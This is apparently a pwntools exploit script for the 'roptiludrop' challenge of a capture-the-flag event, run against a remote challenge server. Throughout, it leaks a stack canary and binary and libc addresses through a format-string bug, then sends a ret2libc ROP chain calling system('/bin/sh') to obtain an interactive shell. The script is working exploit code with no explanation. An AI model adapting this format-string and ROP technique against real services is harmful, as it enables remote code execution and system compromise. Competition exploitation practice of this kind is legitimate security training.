from pwn import *
context.log_level = 'debug'

libc = ELF('./libc-2.31.so')
elf = ELF('./roptiludrop')

#p = process('./roptiludrop')
p = remote("challs.bcactf.com",30344)
p.recvuntil(b'>')
p.sendline(b'%17$pmno%9$p')
#print(hex(elf.sym.main))
main_leak = int(p.recvuntil(b'm')[:-1],16)

print(hex(main_leak))

p.recvuntil(b'o')

canary = int(p.recvn(18),16)
print(hex(canary))

p.recvuntil(b'this? ')
leak = int(p.recvline()[:-1],16)

print(hex(leak))
print(hex(libc.sym.printf))
libc.address = leak - libc.sym.printf
elf.address = main_leak - elf.sym.main
print(hex(libc.address))
print(hex(elf.address))

p.recvuntil(b'> ')

pop_rdi = 0x00000000000013b3 + elf.address
ret = 0x000000000000101a + elf.address
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh\0'))


payload = b'a'*24
payload += p64(canary)
payload += b'a'*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
payload += (len(payload) - 0x50)*b'\x00'

p.sendline(payload)
p.interactive()
